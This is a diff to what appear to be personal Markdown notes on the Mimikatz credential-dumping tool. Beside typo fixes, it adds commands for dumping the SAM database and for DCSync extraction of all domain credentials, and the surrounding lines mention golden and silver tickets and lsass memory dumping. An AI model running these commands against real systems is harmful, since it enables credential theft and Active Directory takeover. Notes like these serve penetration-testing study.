@@ -28,13 +28,13 @@ kerberos::purge
 kerberos::tgt
 ```
 ### golden
-[[Active Directory/Exploitation/Kerberos#Golden Tickets|Golden Tickets]]
+[[Active Directory/Initial Foothold/Kerberos#Golden Tickets|Golden Tickets]]
 - Create golden tickets from krbtgt's NTLM hash or Kerberos keys.
 ### silver
 - Create silver ticket from a service's NTLM hash or Kerberos keys.
 
 # SekurLSA
-Dumps keys, password hashses, pin codes from protected memory of lsass.exe proccess.
+Dumps keys, password hashes, pin codes from protected memory of lsass.exe proccess.
 Rights required:
 - SYSTEM
 - Administrator with debug privilege (privilege::debug)
@@ -54,25 +54,25 @@ sekurlsa::credman
 ```powershell
 sekurlsa::dpapi
 ```
-### dpapisystem
 ### ekeys
 Lists kerberos encryption keys
 ```powershell
 sekursla::ekeys
 ```
-### kerberos
-
-### krbtgt
-### livessp
-### logon passwords
-### minidump
-### msv
-### process
-### pth
-### ssp
-### tickets
-### trust
-### tspkg
-### widget
-
 # LSAdump
+### sam
+- Dumps the sam database directory from memory or offline using the sam and system registry hives.
+```powershell
+# On target machine
+lsadump::sam
+# Using system and sam hives
+lsadump::sam /system:system.hiv /sam:sam.hiv
+```
+### dcsync
+- Perform dc-sync on the domain controller to dump ntds credentails, keys etc.
+```powershell
+# Dump credential of a specidic user
+lsadump::dcsync /domain:mydomain.local /user:dr.dragon
+# Dump all credentials
+lsadump::dcsync /domain:mydomain.local /all
+```
